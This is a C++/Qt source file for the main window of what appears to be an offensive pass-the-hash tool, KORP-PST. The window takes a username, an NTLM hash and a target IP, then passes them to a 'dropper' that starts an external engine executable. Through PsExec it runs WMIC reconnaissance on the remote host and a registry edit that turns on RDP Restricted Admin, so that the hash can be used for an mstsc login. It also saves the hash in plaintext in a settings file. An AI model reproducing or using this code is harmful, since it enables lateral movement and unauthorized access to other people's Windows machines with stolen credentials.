#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QDesktopServices>
#include <QUrl>
#include <QSettings>
#include <Shlwapi.h>

MainWindow::MainWindow(QWidget *parent): QMainWindow(parent), ui(new Ui::MainWindow)
{
    QSettings app_data("./app_settings", QSettings::IniFormat);

    ui->setupUi(this);
    QWidget::setFixedSize(400, 500);
    setWindowFlags(Qt::Dialog | Qt::MSWindowsFixedSizeDialogHint);

    if(!is_user_admin())
    {
        QMessageBox::warning(this, "Administrator Privilege", "You don't have sufficient privilege to use of the PST.\n"
                                                              "Run the program with Administrator privilege.");
    }

    ui->lineEditUsername->setText(app_data.value("app_settings/username", "").toString());
    ui->lineEditPassword->setText(app_data.value("app_settings/password", "").toString());
    ui->lineEditIpAddress->setText(app_data.value("app_settings/ip", "").toString());

    statusBar()->showMessage("Getting Information ...");
}

MainWindow::~MainWindow()
{
    QSettings app_data("./app_settings", QSettings::IniFormat);
    app_data.setValue("app_settings/username", ui->lineEditUsername->text());
    app_data.setValue("app_settings/password", ui->lineEditPassword->text());
    app_data.setValue("app_settings/ip", ui->lineEditIpAddress->text());

    delete ui;
}

bool MainWindow::is_user_admin()
{
    BOOL result;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    PSID administrators_group;
    result = AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administrators_group);
    if(result)
    {
        if (!CheckTokenMembership( NULL, administrators_group, &result))
        {
             result = FALSE;
        }
        FreeSid(administrators_group);
    }

    return result;
}

void MainWindow::get_information()
{
    QString username = ui->lineEditUsername->text();
    QString password = ui->lineEditPassword->text();
    QString ip       = ui->lineEditIpAddress->text();
    QString fs       = ui->comboBoxFileSystemMode->currentText();

    if(password.length() == 32)
    {
        if(fs == "Command Line")
        {
            statusBar()->showMessage("Command Line is triggered.");
            dropper(username, password, ip, fs);
        }
        else if(fs == "Remote Desktop")
        {
            statusBar()->showMessage("Remote desktop is triggered.");
            remote_desktop(ip);
        }
        else if(fs == "Console based File System")
        {
            statusBar()->showMessage("CUI mode connection is triggered.");
            dropper(username, password, ip, fs);
        }
        else if(fs == "Graphical based File System")
        {
            statusBar()->showMessage("GUI mode connection is triggered.");
            QMessageBox::information(this, "Graphical File Manager", "Graphical File Manager will add to the PST in the next major release.");
        }
        else
        {
            QMessageBox::information(this, "Select Payload", "Select an appropriate payload.");
        }
    }
    else
    {
        QMessageBox::warning(this, "NTLM Password Length", "The NTLM password must have 32 characters.");
    }
}

void MainWindow::create_temporary_files()
{
    QDir().mkdir("storage");

    QString storage_path = qApp->applicationDirPath();
    storage_path.append("/storage");

    // Copy PsExec to temp directory
    QFile::copy(qApp->applicationDirPath() + "/PsExec.exe", "storage/PsExec.exe");

    // Batch file created here. This file consist of WMIC command to generate
    // and also to fill log files with remote machine information
    QFile batch_file("storage/PSTRequirement.bat");
    batch_file.open(QIODevice::ReadWrite | QFile::Text);

    QString ps_exec = "PsExec.exe -r pthsrv \\\\";
    ps_exec.append(ui->lineEditIpAddress->text());
    QString app_name = "wmic";

    QString info_type = "logicaldisk";
    QString command_description = "get description > pthdescription.log";
    QString final_command_description = "if not exist pthdescription.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_description + ")";

    QString command_names = "get DeviceID > pthnames.log";
    QString final_command_names = "if not exist pthnames.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_names + ")";

    QString command_space = "get FreeSpace > pthspace.log";
    QString final_command_space = "if not exist pthspace.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_space + ")";

    QString command_size = "get size > pthsize.log";
    QString final_command_size = "if not exist pthsize.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_size + ")";

    QString command_file = "get FileSystem > pthfile.log";
    QString final_command_file = "if not exist pthfile.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_file + ")";

    QString command_system = "get SystemName > pthsysname.log";
    QString final_command_system = "if not exist pthsysname.log (" + ps_exec + " " + app_name + " " + info_type + " " + command_system + ")";

    QTextStream stream_to_file(&batch_file);

    stream_to_file << "@echo off" << "\n"
                   << "cd " << storage_path << "\n"
                   << final_command_description << "\n"
                   << final_command_names << "\n"
                   << final_command_space << "\n"
                   << final_command_size << "\n"
                   << final_command_file << "\n"
                   << final_command_system << "\n";

    batch_file.close();
}

wchar_t* MainWindow::get_current_path(wchar_t* arg_dest, DWORD arg_dest_size)
{
    if (!arg_dest)
    {
        return NULL;
    }
    if (MAX_PATH > arg_dest_size)
    {
        return NULL;
    }

    GetModuleFileNameW(NULL, arg_dest, arg_dest_size);
    PathRemoveFileSpecW(arg_dest);
    return arg_dest;
}


void MainWindow::remote_desktop(QString arg_target_ip)
{
    bool status_bat = FALSE;
    STARTUPINFOW si_bat;
    PROCESS_INFORMATION pi_bat;

    ZeroMemory(&si_bat, sizeof(si_bat));
    si_bat.cb = sizeof(si_bat);
    ZeroMemory(&pi_bat, sizeof(pi_bat));

    wchar_t exe_path[MAX_PATH];
    get_current_path(exe_path, MAX_PATH);
    wchar_t path_bat[MAX_PATH] = { 0 };

    wcscpy_s(path_bat, exe_path);
    wcscat_s(path_bat, L"\\storage\\PTHrdp.bat");

    LPWSTR final_bat_path = _wcsdup(path_bat);

    // Execute requirement batch file
    status_bat = CreateProcessW(NULL, final_bat_path, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_bat, &pi_bat);

    if (status_bat)
    {
        WaitForSingleObject(pi_bat.hProcess, INFINITE);
        CloseHandle(pi_bat.hProcess);
        CloseHandle(pi_bat.hThread);

        bool status_rdp = FALSE;
        STARTUPINFOW si_rdp;
        PROCESS_INFORMATION pi_rdp;

        ZeroMemory(&si_rdp, sizeof(si_rdp));
        si_rdp.cb = sizeof(si_rdp);
        ZeroMemory(&pi_rdp, sizeof(pi_rdp));

        wchar_t command_rdp[MAX_PATH] = { 0 };
        wcscpy_s(command_rdp, L"mstsc /v:");
        wcscat_s(command_rdp, arg_target_ip.toStdWString().c_str());
        wcscat_s(command_rdp, L" /restrictedadmin");
        LPWSTR rdp = _wcsdup(command_rdp);

        // Execute requirement batch file
        status_rdp = CreateProcessW(NULL, rdp, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_rdp, &pi_rdp);
        if (status_rdp)
        {
            WaitForSingleObject(pi_rdp.hProcess, INFINITE);
            CloseHandle(pi_rdp.hProcess);
            CloseHandle(pi_rdp.hThread);
        }
        else
        {
            QMessageBox::warning(this, "RDP Connection", "KORP-PST failed to connect with RDP.");
        }
    }
}

void MainWindow::dropper(QString arg_username, QString arg_password, QString arg_computer_name, QString arg_ui_type)
{
    QString username = "user:";
    QString password = "ntlm:";
    QString domain = "domain:null";
    QString computer_name = "pc:";
    QString ui_type = "ui:";

    username.append(arg_username);
    password.append(arg_password);
    computer_name.append(arg_computer_name);
    ui_type.append(arg_ui_type);

    QString arguments = username + " " + password + " " + domain + " " + computer_name + " " + ui_type;

    if(ShellExecuteA(NULL, NULL, "pst-engine.exe", arguments.toStdString().c_str(), NULL, SW_SHOWNORMAL))
    {
        statusBar()->showMessage("Connecting to " + computer_name);
    }
    else
    {
        statusBar()->showMessage("Connection Failed.");
    }

}

void MainWindow::powershell_command()
{
    QString storage_path = qApp->applicationDirPath();
    storage_path.append("/storage");

    // Batch file created here. This file used to clean temporary files.
    QFile batch_file("storage/PTHrdp.bat");
    batch_file.open(QIODevice::ReadWrite | QFile::Text);

    QString dn_powershell_command = "PsExec.exe -r pthsrv \\\\";
    dn_powershell_command.append(ui->lineEditIpAddress->text());
    dn_powershell_command.append(" /accepteula cmd /c \"");
    dn_powershell_command.append("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD /f\"");

    QTextStream stream_to_file(&batch_file);

    stream_to_file << "@echo off" << "\n"
                   << "cd " << storage_path << "\n"
                   << dn_powershell_command << "\n";

    batch_file.close();
}

void MainWindow::on_actionAbout_triggered()
{
    aboutWindowForm.show();
}

void MainWindow::on_actionExit_triggered()
{
    QApplication::quit();
}

void MainWindow::on_pushButtonConnection_clicked()
{
    statusBar()->showMessage("Getting and Verification of Target Machine Information ...");
    create_temporary_files();
    powershell_command();
    get_information();
}

void MainWindow::on_pushButtonExit_clicked()
{
    QApplication::quit();
}


void MainWindow::on_actionMode_triggered()
{
    statusBar()->showMessage("Getting and Verification of Target Machine Information ...");
    create_temporary_files();
    powershell_command();
    get_information();
}


void MainWindow::on_actionCheck_Update_triggered()
{
    QDesktopServices::openUrl(QUrl("https://github.com/kaipodresearch/korp-pst"));
}


void MainWindow::on_actionKaipod_triggered()
{
    QDesktopServices::openUrl(QUrl("http://kaipod.ir/"));
}

